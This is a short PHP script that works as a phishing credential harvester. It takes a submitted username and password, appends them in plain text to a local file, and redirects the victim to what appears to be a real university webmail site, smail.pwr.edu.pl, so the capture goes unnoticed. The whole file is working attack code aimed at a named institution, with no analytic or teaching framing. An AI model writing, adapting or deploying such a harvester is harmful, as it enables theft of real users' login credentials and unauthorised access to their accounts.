<?php
    if(isset($_POST['username']) && isset($_POST['password'])) {
        $data = $_POST['username'] . '-' . $_POST['password'] . "\n";
        $ret = file_put_contents('tmp/mydata.txt', $data, FILE_APPEND | LOCK_EX);
        if($ret === false) {
            die('There was an error writing this file');
        }
        else {
            //echo "$ret bytes written to file";
            header('Location: https://smail.pwr.edu.pl/');
        }
    }
    else {
        die('no post data to process');
    }